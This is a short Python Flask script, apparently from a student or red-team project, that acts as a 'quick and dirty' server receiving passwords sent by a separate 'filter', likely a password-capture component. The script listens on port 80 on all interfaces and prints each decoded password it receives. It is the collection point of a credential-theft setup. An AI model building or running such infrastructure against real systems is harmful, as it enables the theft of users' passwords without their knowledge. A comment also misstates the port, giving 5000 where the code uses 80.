#
# ChatGPT, Asa Horn (in that order)
# aoh9470@rit.edu
#

# Very quick and dirty flask web server to receive Passwords being sent
# from the filter

from flask import Flask, request

app = Flask(__name__)

@app.route('/post', methods=['POST'])
def handle_post():
    # Get the JSON payload from the POST request
    data = request.data

    text = data.decode('utf-16le')

    # Print the payload to the console
    print("Received POST data:", text)

    # Return a response
    return "POST request received", 200

if __name__ == '__main__':
    # Run the Flask app on port 5000
    app.run(debug=True, host='0.0.0.0', port=80)
